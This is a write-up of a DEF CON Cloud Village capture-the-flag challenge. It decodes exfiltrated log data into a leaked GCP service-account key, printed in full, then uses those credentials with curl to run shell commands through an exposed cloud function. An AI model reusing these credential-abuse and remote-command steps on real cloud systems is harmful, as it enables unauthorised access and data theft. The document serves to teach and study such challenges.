---
layout: post
title:  "CV CTF - Beacons of Shadowspire"
date:   2024-08-13 13:52:27 -0600
categories: ctf cloudvillage
tags: defcon ctf cloudvillage
description: "Writeup/Solution to Defcon 2024 Cloud Village CTF: The Beacons of Shadowspire"
---

## Prompt

>The council of cyber mages has detected sinister activity emanating from their communication beacons. These beacons are mysteriously contacting an unknown malevolent entity called Shadowspire. As the realm's foremost cyber wizard, your task is to investigate these dark channels and disarm the chaos spell to unravel Shadowspire's intentions.

`beacon_logs.zip`

## Solution

Unzipping the `beacon_logs.zip` file we get the following:

```console
$ tree beacon_logs
beacon_logs
├── conn.log
├── dhcp.log
├── dns.log
├── files.log
├── http.log
├── packet_filter.log
├── ssl.log
└── x509.log
```

These files are all json data that likely were produced by a reverse proxy like nginx.

The file that was the key to the first part was `http.log` which was logging http requests with suspicious data such as:

```json
{
  "ts": 1720419959.112572,
  "uid": "CSrFzQ3vhbZQqRA2N",
  "id.orig_h": "192.168.40.132",
  "id.orig_p": 47032,
  "id.resp_h": "137.184.85.128",
  "id.resp_p": 5000,
  "trans_depth": 1,
  "method": "POST",
  "host": "137.184.85.128:5000",
  "uri": "/command",
  "version": "1.1",
  "user_agent": "curl/8.5.0",
  "request_body_len": 1388,
  "response_body_len": 33,
  "status_code": 200,
  "status_msg": "OK",
  "tags": [],
  "orig_fuids": [
    "FH8mcG3rS0RyL9zeci"
  ],
  "orig_mime_types": [
    "text/json"
  ],
  "resp_fuids": [
    "FTTHWw36KP5FHN1SF1"
  ],
  "resp_mime_types": [
    "text/json"
  ],
  "post_body": "{\"command\": \"exfil_data\", \"data\":\"Y2hhb3NzcGVsbA==VUdyME5jZWRlVEVjRmFZaE5zcVJFb1llNEpXY2JJbXZQSldZRkxtSnE2WG5qajNGRnFnUU54SjJKS01vaEFPMUwzWUxienhhUDNJamxKQWFlbjJzZGVzTEcwN1NIWU5GcnBzaVRERE9IUXp6S2hCV1dhc2RsM1pueURMb1Rkc3VVMjFaSnRpMTB1TFJhSm1OVkxyZ3dZdHI0Y3l1NVFoajA3ekJCZENoSDBFMHBBRkRkWkZlMDZZYWNwSklvRXRwSnRmaGFOVERiRjZkbWlCU0FqTlBwclNldTJ6QlQ4NzE2Z3lZUkE3eE14amd2WjhRdGVSTjVpNjFvMHRtMWlSS0xiMGxJaXNDOElsdVlsUGNLSU15Um1LM0JxbFBKamF2SEVVaUtuWDMyM1JaVjV2d1VlOWVsSHh0OE15RlNBMVFTb1U1Wjl0TXEzTmlwaWxZVTczVGVJbUJZMFRwS0Q2M3I0VTZGT1BEbFozbzBraXN5Nm5ZcUtjY0JPODBKak95MDViZ21lZGxsUXEwcjVra2V1ZFJCTWliV1NmeFU3TTBGZkZ3cFJwbFUybXFIT3lzTFhDTVNPTzhIVXNVTE5rbWhIVENZOWF6OTdkdDc5VkZsSGFCOU9zZzExSGJiNTVmQXdoVG1PZ2xURmJJWkJOUWQzdTNJc1NiMm13c2RseVBJTVhyOTZuR2hXN3VwR2ExQjhrdjFIMENiQVE3cTVQa2djZFd0ZXIzcmYzM3lEd3ROWllxMHlqbDJYaVNLY0VtazhuQ1dsVDA3cWNBOUtzUjRFaXR1bWVya0J5bUJnN0Izclc4Y3huNGQ4dHpEbk5aUDRuc25LNlZ5T2M2NlBJM3l6SThReTU1MVNVV25BTlZqUTlORXZTR3JIeEVKMHZWblpjOVJNZllwM2tJZHdVZTA1b3BZWUduOWJuRlo2NXdkRHR2NENNUk43RFFDamlvZjFYazF4Z2VjWnFqZnNhbVF6MVNob1ZDUjBrT3N4RnNXYkdqa3VPcThwYnpGQkxhT212UWxXMTZuY29BeFJ2MmtVYVN3UTExU3ZZcGlxZ3ZrN1U3VWNMTDdTS2RJVHlxU1Y5Tmp6UHE2V3BLVzVWbzJVdmdENE93QXd6aUx0ZzZJUElKZEF0M0FkNWtKaXd5N05mMlN3UzVFU245bzNtS21xMmkyQ0NNY0FXZUNYY2dwZ1NhckQybjVKbjJJQWFlRWhuTFpoSHZ1cjY5cFVMVXVpNERQbDdHaURudWdDRWd0R3JJVkg0M0VDSW83SUFkUGlhQ0w5WEpKUG5aRnZ2ZFAzaWNuQjJxSVNTRUlUcVE3dURtWVBJNg==\"}"
}
```

We can base64 decode the `post_body` data value:

```console
echo 'Y2hhb3NzcGVsbA==VUdyME5jZWRlVEVjRmFZaE5zcVJFb1llNEpXY2JJbXZQSldZRkxtSnE2WG5qajNGRnFnUU54SjJKS01vaEFPMUwzWUxienhhUDNJamxKQWFlbjJzZGVzTEcwN1NIWU5GcnBzaVRERE9IUXp6S2hCV1dhc2RsM1pueURMb1Rkc3VVMjFaSnRpMTB1TFJhSm1OVkxyZ3dZdHI0Y3l1NVFoajA3ekJCZENoSDBFMHBBRkRkWkZlMDZZYWNwSklvRXRwSnRmaGFOVERiRjZkbWlCU0FqTlBwclNldTJ6QlQ4NzE2Z3lZUkE3eE14amd2WjhRdGVSTjVpNjFvMHRtMWlSS0xiMGxJaXNDOElsdVlsUGNLSU15Um1LM0JxbFBKamF2SEVVaUtuWDMyM1JaVjV2d1VlOWVsSHh0OE15RlNBMVFTb1U1Wjl0TXEzTmlwaWxZVTczVGVJbUJZMFRwS0Q2M3I0VTZGT1BEbFozbzBraXN5Nm5ZcUtjY0JPODBKak95MDViZ21lZGxsUXEwcjVra2V1ZFJCTWliV1NmeFU3TTBGZkZ3cFJwbFUybXFIT3lzTFhDTVNPTzhIVXNVTE5rbWhIVENZOWF6OTdkdDc5VkZsSGFCOU9zZzExSGJiNTVmQXdoVG1PZ2xURmJJWkJOUWQzdTNJc1NiMm13c2RseVBJTVhyOTZuR2hXN3VwR2ExQjhrdjFIMENiQVE3cTVQa2djZFd0ZXIzcmYzM3lEd3ROWllxMHlqbDJYaVNLY0VtazhuQ1dsVDA3cWNBOUtzUjRFaXR1bWVya0J5bUJnN0Izclc4Y3huNGQ4dHpEbk5aUDRuc25LNlZ5T2M2NlBJM3l6SThReTU1MVNVV25BTlZqUTlORXZTR3JIeEVKMHZWblpjOVJNZllwM2tJZHdVZTA1b3BZWUduOWJuRlo2NXdkRHR2NENNUk43RFFDamlvZjFYazF4Z2VjWnFqZnNhbVF6MVNob1ZDUjBrT3N4RnNXYkdqa3VPcThwYnpGQkxhT212UWxXMTZuY29BeFJ2MmtVYVN3UTExU3ZZcGlxZ3ZrN1U3VWNMTDdTS2RJVHlxU1Y5Tmp6UHE2V3BLVzVWbzJVdmdENE93QXd6aUx0ZzZJUElKZEF0M0FkNWtKaXd5N05mMlN3UzVFU245bzNtS21xMmkyQ0NNY0FXZUNYY2dwZ1NhckQybjVKbjJJQWFlRWhuTFpoSHZ1cjY5cFVMVXVpNERQbDdHaURudWdDRWd0R3JJVkg0M0VDSW83SUFkUGlhQ0w5WEpKUG5aRnZ2ZFAzaWNuQjJxSVNTRUlUcVE3dURtWVBJNg==' | base64 -d

chaosspellUGr0NcedeTEcFaYhNsqREoYe4JWcbImvPJWYFLmJq6Xnjj3FFqgQNxJ2JKMohAO1L3YLbzxaP3IjlJAaen2sdesLG07SHYNFrpsiTDDOHQzzKhBWWasdl3ZnyDLoTdsuU21ZJti10uLRaJmNVLrgwYtr4cyu5Qhj07zBBdChH0E0pAFDdZFe06YacpJIoEtpJtfhaNTDbF6dmiBSAjNPprSeu2zBT8716gyYRA7xMxjgvZ8QteRN5i61o0tm1iRKLb0lIisC8IluYlPcKIMyRmK3BqlPJjavHEUiKnX323RZV5vwUe9elHxt8MyFSA1QSoU5Z9tMq3NipilYU73TeImBY0TpKD63r4U6FOPDlZ3o0kisy6nYqKccBO80JjOy05bgmedllQq0r5kkeudRBMibWSfxU7M0FfFwpRplU2mqHOysLXCMSOO8HUsULNkmhHTCY9az97dt79VFlHaB9Osg11Hbb55fAwhTmOglTFbIZBNQd3u3IsSb2mwsdlyPIMXr96nGhW7upGa1B8kv1H0CbAQ7q5PkgcdWter3rf33yDwtNZYq0yjl2XiSKcEmk8nCWlT07qcA9KsR4EitumerkBymBg7B3rW8cxn4d8tzDnNZP4nsnK6VyOc66PI3yzI8Qy551SUWnANVjQ9NEvSGrHxEJ0vVnZc9RMfYp3kIdwUe05opYYGn9bnFZ65wdDtv4CMRN7DQCjiof1Xk1xgecZqjfsamQz1ShoVCR0kOsxFsWbGjkuOq8pbzFBLaOmvQlW16ncoAxRv2kUaSwQ11SvYpiqgvk7U7UcLL7SKdITyqSV9NjzPq6WpKW5Vo2UvgD4OwAwziLtg6IPIJdAt3Ad5kJiwy7Nf2SwS5ESn9o3mKmq2i2CCMcAWeCXcgpgSarD2n5Jn2IAaeEhnLZhHvur69pULUui4DPl7GiDnugCEgtGrIVH43ECIo7IAdPiaCL9XJJPnZFvvdP3icnB2qISSEITqQ7uDmYPI6
```

Mostly gibberish except for the first part `chaosspell`... We tried a decoding a few more to the same problem.

After struggling with it for a while and looking at other things we came back to it with the thought of "what if _one_ of them is different". The file was too large to do this by hand for each one, so I threw together a quick python script to attempt to parse and decode every line.

```python3
import json
import base64

filename = "./beacon_logs/http.log"

lines = []

with open(filename) as f:
	for line in f:
		lines.append(json.loads(line))

for line in lines:
	try:
		data = json.loads(line['post_body'])["data"]
		decode = base64.b64decode(data)
		print(decode)
	except Exception as e:
		pass
```

Running and piping to `sort | uniq` dumped out what we needed:
```console
b'chaosspell'
b'cybermage: Hey! We were testing a cloud function the other day can you send me the URL? Cant find it\r\nmagedev: Sure, give this a try - https://us-west2-proven-dialect-428006-g6.cloudfunctions.net/magevault?cmd=echo%20%test\r\ncybermage: Make sure you turn this function off once you are done with testing\r\nmagedev: Sure thing!'
b'chaosspell'
b'{\n  "type": "service_account",\n  "project_id": "proven-dialect-428006-g6",\n  "private_key_id": "a8daaa3ac9c97ea2b17e6fc77c6481e94e9d27b9",\n  "private_key": "-----BEGIN PRIVATE KEY-----\\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDn2e2uk/vrePvu\\nL8yceioEkeaGM47F9f6EQ6eiDqt8/m7l54av/Ev/Tv/OU8W3KX0tXDDGsQQVoxo7\\nFDohFcHz0deDp9pAt2XUclej1TdQTzfmqV9VNzW+XIN/pEH5h2rXGTXoZ6nZRqFU\\naWSzOspyDZr9xWWy0f1d798GH2Rcp8zB5kCiW9dqHd09TcQu7BPKOF8NlwtyuhF/\\nm9eRTqtTpjPW5OuyUc7wXyLoVEAQFg88LbkG19lWP+ngA62XaqJkDIz6FjUUBVSS\\nCyF2bCCAQylpfdAeTFZ7VHbj8x5o9ouGBcB2NPoTXOSs/jR/4ObEHQtW5IhNYhwE\\nA2SscAtLAgMBAAECggEAAeppjdc4LiZmQn4PnT1fKoGAG5zCcb1KGJKsiGjBnvtF\\nNE4Y7UxS3m2rLGvBxvUnTSAlYQbmZz1dQp60qkBRRW/27WYOJhm91CcLtVVWKyo0\\nZooAuSYHIicGiR/00Zh+V/+j0+NDYoG0ZIuoYti6An49SRp/8B3PD58jQxwwSpmu\\nT0QZ6C/36oSL+pT6KnBNUfqZdZ2UBYGMre7MwrQO342ZOqjDWn+7x0P6W9SM/2+m\\nK+b+KS9zTX+UeNK2ZkB+woOsdy6mEB7XzsDBUckaPD8GzBKb7kt3+pAinZEMJhxB\\nYLL9gJLnONyHEcA3DBb92tlCUVcbErRGPRv2FQ4XoQKBgQD0mhfTN3sHKhxXH9HA\\nE/z5W2R5aYl5i4SMiLyHBwrdPDBftvShufSpdTZrFc9Rrljah0NYzEPWDczX5Zd8\\nV3iojNsktBxaE1rTpdKhxStDrtxDNJD1RuNAbnFANrlWwLC/lFkdpVYZaajEelk6\\nkwq/aYQZoUlzEB73WHTo2nGgKwKBgQDyp7r2Ybfe6YIdz3/q2i5Ur6JJSq7z9hFD\\n99PgfogVMIeo+02nN2+weSWWHFAQML0nrnSg6a73QHfP1mfVFAc+n3BLRERvjwLx\\noX6rZ02eAyeHXwuVJ5dJkPhnRo8/bXWNFpy0CpeWUHhasEOu2TLXS+NTSZ25YI4a\\nUw5GY/6RYQKBgB2C1esK35IOt5qfYSwefUAMkcPAQvDiL1zRRoW4CMyGbYOuzDcS\\n+3zSgn1LBVdihJ/g//QfuPODeLp3nd5Ho2wainoULPOFMEkm0ZHo+v5Qg4ysM+0T\\n32kvqgRIVfYsi2ah3FqiTxAD2nPSGx/hC8PqVCDPf9AdGs9W4cwSRvE/AoGBANIc\\nEFSEmnym/qanZGDL2PA1QDVsOH8/4wVSUyEBDv4iDmVwbHXNF6Xb0ILhMyZBvZfd\\nhFlM3tZy+Qt64F9tPzSnQ8m4a/WZBHiLWK47/cZDfvfFgbb+GA54O87ZFvJZ6j5n\\nhPqUbVuXhA8qrwB4S4CG0mjsxmicxY7fue2TafshAoGBAL6n5elOS4qnBv56sLVH\\nZh794v8eCTy7L4ukiM7l6+a5bagWS8MePnQwE0wfeevpcJXeVaNLb07Du4nWa4cD\\nlrpqRDXBBJgD9FnABoxeHqMMSMxpLzQcm4QnNcISjv+M/oAkVySKWUjFEc31OJH+\\nDrtYzl5jQFz1yf97s3Z8glWR\\n-----END PRIVATE KEY-----\\n",\n  "client_email": "cybermage-test@proven-dialect-428006-g6.iam.gserviceaccount.com",\n  "client_id": "105483015063847859708",\n  "auth_uri": "https://accounts.google.com/o/oauth2/auth",\n  "token_uri": "https://oauth2.googleapis.com/token",\n  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",\n  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/cybermage-test%40proven-dialect-428006-g6.iam.gserviceaccount.com",\n  "universe_domain": "googleapis.com"\n}\n'
```

Two things: A url `https://us-west2-proven-dialect-428006-g6.cloudfunctions.net/magevault?cmd=echo%20%test`
and credentials... We recognized these as gcloud key file credentials.

We saved the credentials:

```json
{
  "type": "service_account",
  "project_id": "proven-dialect-428006-g6",
  "private_key_id": "a8daaa3ac9c97ea2b17e6fc77c6481e94e9d27b9",
  "private_key": "-----BEGIN PRIVATE KEY-----\n...trimming\n-----END PRIVATE KEY-----\n",
  "client_email": "cybermage-test@proven-dialect-428006-g6.iam.gserviceaccount.com",
  "client_id": "105483015063847859708",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/cybermage-test%40proven-dialect-428006-g6.iam.gserviceaccount.com",
  "universe_domain": "googleapis.com"
}
```

And now we can authenticate to gcloud with a service account:

```console
$ gcloud auth activate-service-account --key-file=creds.json
Activated service account credentials for: [cybermage-test@proven-dialect-428006-g6.iam.gserviceaccount.com]
```

We did some poking around at the URL and discovered it was a [gcloud function](https://cloud.google.com/functions/docs/). Looking at our specific url, it appeared to be accepting a `cmd` param and executing whatever it was.

Apparently its possible to execute them from the command line with a service account as a bearer token which makes things easier.

We can url encode the parameter using just curl (as long as you use `-G` for GET requests). Using `ls` to confirm we got:

```console
$ curl https://us-west2-proven-dialect-428006-g6.cloudfunctions.net/magevault -H "Authorization: bearer $(gcloud auth print-identity-token)" -G --data-urlencode 'cmd=echo "$(ls)"'

flag.txt
main.py
__pycache__
requirements.txt
```

Then cat the `flag.txt`:
```console
$ curl https://us-west2-proven-dialect-428006-g6.cloudfunctions.net/magevault -H "Authorization: bearer $(gcloud auth print-identity-token)" -G --data-urlencode 'cmd=echo "$(cat flag.txt)"'

import random ,base64,codecs,zlib,sys;py=""
sys.setrecursionlimit(1000000000) 
pyobfuscate = (lambda **kwargs: (list(kwargs.keys()),list(kwargs.values())))(**{'https://pyobfuscate.com':'ArithmeticError ^ license','exec':'eHI47X7N5G5jOhwI4YBnphBfiuQMnINTzIVCYEUqRUEZhfWO8YvEVJAwW2Ilm2QKlhgL7gFi3QeVgzCG','eval': bytes.fromhex('''86d3779813d88e8b05081accaceae5d6e442e7b99ba85474dc1f657334f2bf75bacce6dc410ee62886b76548cc76fb4df55ec7c4b7ab553466ca3565e53aca7c216053e866271379b635b154da3553a07e957fd2e1e8cfce8311210e744def2f5dee873edeb942fd197fcf5266de4b08ad16801d07b57ad27f1defe8e65ccaebcda8088eb743545f9ca49c59e4d79b45afe12f29361244944bf7bdabdc6f8d7b'''.replace("","")) })
_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='173340 8805560 896154 1313092 2579318 789730 639744 257568 342528 2087616 2921076 4804986 6045060 9043621 825024 10964520 165236 10846079 7787403 5794673 5243655 299744 4538705 1367584 664545 6389362 10310720 9037509 7260204 3508768 653344 4463196 3208164 8624020 519530 6131205 7261440 4221063 1381882 6542480 4191892 498104 902270 320544 1697728 3039584 634528 7135856 1776462 1987965 967780 8944064 478680 3175192 3985072 4425435 10842048 1325728 7531440 7633010 5469975 1958892 4943120 5254416 4120092 1846784 1527714 7404714 10891392 9482031 8608937 1154255 9061224 1344465 2946950 2578613 3627143 5550195 3078790 5353600 331344 10291172 812960 1380026 7764848 5969382 5929609 362135 9281650 1440224 8175344 4208490 11217200 4794167 3007092 1178912 11069300 2271948 760160 4902795 804000 5517225 1789996 1516706 741321 4934996 1758309 2770440 1351875 8995800 359760 1477189 951180 181760 3479628 8529192 1587342 5133108 934755 1248856 1406160 1704386 8452184 10446148 3049408 8412656 11119810 1758908 3089686 1021498 9698528 5677683 10506594 192276 2354874 5461560 7644050 7106616 9152823 1089820 7449457 4295710 9534888 288267 6200901 2646758 3672592 6379120 2942600 4417671 1003174 2970612 10663030 2005416 3542756 8935320 2747460 2720034 2113058 1165272 4704612 6906077 7357080 5260484 336340 755160 6032766 6132159 1203094 77220 1732608 1854816 2815872 1970496 6815538 8029362 8617818 3163834 1564512 930846 3031055 181516 3260320 5728820 1546976 9100520 740000 7965930 8766543 10715040 6323559 5994690 1169164 1185536 566711 6388440 7032795 9826175 6728000 5532075 2583136 2931146 8405350 1619872 5879917 5016720 926550 2118496 3039936 1393344 727712 2516034 6586692 7821615 4410358 524576 7927176 5657655 1877632 5866665 7819006 10541440 1572759 4490688 2847916 2985984 813185 5925367 4485488 7177060 7200490 3422826 2657632 8254118 10564705 1563744 3411772 2394104 2061576 5512698 8648630 8651875 6691857 7866824 7225944 341040 115168 2461408 1892736 2048736 6437016 6276051 95634 501054 6113256 6333811 466080 2948985 846560 1669600 4671840 3008728 4262635 98280 1889095 1744275 1755374 3454686 8880704 1578927 5198115 8601012 10791309 5382432 2436896 1595654 4111848 5106092 5949689 5632770 6470360 3818828 5255612 3011880 10668172 2981664 4272485 9900464 205650 1949682 703728 5179038 1896444 3653065 2196094 1743308 3842012 4473588 7319060 5451206 1492424 3905952 4672560 3002312 697714 1109967 5291776 2804439 1548729 5403888 10338762 925452 4092181 2829990 6361616 3835572 4719923 2463289 9747055 1062950 678454 7926048 5279280 4518432 11968 386490 631840 2649152 1818368 2263936 2380832 329700 5344494 2636032 4348252 808080 1355880 1742832 1808051 707250 5317126 1565138 226800 10811874 9121905 1697507 2532802 641890 1702592 923808 1214848 2609888 2912320 987520 675008 3024608 7376712 5365322 4477066 5118543 3318868 299768 3844560 8749328 772436 3216901 5420 2566816 1867872 1405152 1125952 8029298 868428 10079160 3219120 1489120 8910220 496680 3599520 3528112 3003650 2780497 2540772 4462943 2447928 7969170 722007 4832446 5683014 346320 1151008 1722496 2352128 2965408 1188128 3167776 2512416 966080 10928154 5252606 8128675 465090 3124050 351682 796400 6614160 960700 2179314 658690 219936 2439968 2776128 1162688 3669435 2449428 2950304 9276749 3374520 3104000 11132240 3961374 545259 3273443 358741 6605060 3092942 10152000 4178525 180083 2362166 46690 2587136 177824 2894688 689920 2751584 1276544 2648288 3129632 1765841 9990750 3758632 7037264 796352 7664772 644896 3605397 657360 1030320 10002470 897492 7808202 2996120 918064 162894 1239471 3436180 3194232 2711296 2371024 311149 1360288 1846395 7323545 251744 9497030 148480 9319876 4303024 9047570 4703754 9365265 5626116 4798106 1910240 10078830 7144092 9834324 1653440 8642562 5062500 2781030 1635326 782240 2229568 1040608 802784 809984 6763768 11433480 1505809 1679931 1201560 5953818 10601808 7089190 5075510 448280 6688304 2111000 4030997 4081580 8018874 3351685 6049211 7803900 3757400 1161571 2562172 495520 2928896 3056576 406880 171936 118670 9409362 7237560 322542 1423797 139104 11566940 2242744 507990 29472 428640 1702240 1983808 10029199 9099840 8076061 7080084 3203200 4696896 7679232 1763451 943270 890070';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJyLKi/JcnL3M3UKLDFxCizIigosMY1yrzAGAGYBCAQ=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kMtugzAURH8pOKCGpSPiBoOjIFxj2AFteIRXWhtsf33dtOruzGikmXuzYSlZmcnZnLoZeSPBoeKp/xU5hyo26Uhe411uGID0pGPgK4LkNgPL+6IlNHwyf6tvE2Z/2ukXE47LINc4ghpuQRtv8e4/S1nNkacIhh2h54qje/+JvPcZ6JZTWC2rrOcyqCZ0cDlSghh/YFSJCbsCj+perL04JsLNrxev2MSNJYX348Hk4kZI1bkJ29+dwvao+ghCl+CiegDp8b3uHqiRizl/2I2SUN2SodlNVI8cSGe6Ptl66mUxqb3Hb/ISaoKDqkBqzeyvvgEFpGq5")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')

```

Its a python file that is heavily encoded. We actually spent wayyyy to long trying to decode it by hand before just trying to run the damn thing...

```console
$ python3 flag.txt 
FLAG-{xfRgQDGOPe0fHrq5I3TIiPU33wK4t1lR}
```
